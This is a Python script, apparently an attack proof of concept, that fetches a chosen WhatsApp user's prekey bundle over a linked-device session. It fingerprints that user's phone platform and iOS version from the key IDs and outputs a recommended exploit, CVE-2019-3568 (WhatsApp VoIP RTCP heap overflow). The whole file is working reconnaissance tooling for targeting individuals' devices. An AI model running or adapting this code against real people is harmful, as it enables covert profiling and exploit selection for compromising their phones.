#!/usr/bin/env python3
"""Live prekey bundle fetch for WhatsApp device fingerprinting PoC."""

import argparse
import json
from typing import Any

from pywhats.client import Client
from pywhats.events import JID as PyJID
from pywhats.messaging.prekey import PrekeyFetcher
from pywhats.messaging.receiver import PendingIqMap

from native_wrapper import fingerprint as native_fingerprint


def bundle_to_real_data(bundle: Any, platform: str, ios_version: Any = None) -> dict:
    otpk_id = bundle.one_time_pre_key_id
    return {
        "signed_pk_id": int(bundle.signed_pre_key_id or 0),
        "otpk_ids": [int(otpk_id)] if otpk_id is not None else [],
        "platform_hint": platform,
        "ios_version": ios_version,
        "source": "live",
    }


async def run_live(
    jid_user: str,
    platform: str,
    ios_version: Any = None,
    session_path: str = None,
    out: str = None,
) -> int:
    client = Client(session_path=session_path)
    await client.connect()
    try:
        peer = PyJID(user=jid_user, server="s.whatsapp.net", device=0)
        fetcher = PrekeyFetcher(client._transport, PendingIqMap())
        bundle = await fetcher(peer)
        data = bundle_to_real_data(bundle, platform, ios_version)
        result = native_fingerprint(
            data["signed_pk_id"],
            data.get("otpk_ids", []),
            platform_hint=2 if platform == "iOS" else 1,
            ios_version=ios_version or 0,
        )
        recommended = {"cve": "CVE-2019-3568", "name": "WhatsApp VoIP RTCP Heap Overflow", "recommendation": "Use universal CVE-2019-3568"}
        out_data = {
            "live": True,
            "jid": jid_user,
            "platform_hint": platform,
            "bundle": data,
            "fingerprint": {"final_guess": result["platform_name"], "final_confidence": result["confidence"], "exploit_cve": result["exploit_cve"]},
            "recommended_exploit": recommended,
        }
        if out:
            with open(out, "w") as f:
                json.dump(out_data, f, indent=2, default=str)
        print(json.dumps(out_data, indent=2, default=str))
        return 0
    finally:
        await client.disconnect()


def main() -> int:
    parser = argparse.ArgumentParser(description="Live WhatsApp prekey fetch + fingerprint")
    parser.add_argument("--jid", required=True, help="Target WhatsApp user id (e.g. 15551234567)")
    parser.add_argument("--platform", required=True, choices=["Android", "iOS"])
    parser.add_argument("--ios-version", default=None)
    parser.add_argument("--session", default=None, help="pywhats device session path (linked device)")
    parser.add_argument("--out", default=None)
    args = parser.parse_args()

    import asyncio

    return asyncio.run(
        run_live(
            jid_user=args.jid,
            platform=args.platform,
            ios_version=args.ios_version,
            session_path=args.session,
            out=args.out,
        )
    )


if __name__ == "__main__":
    raise SystemExit(main())
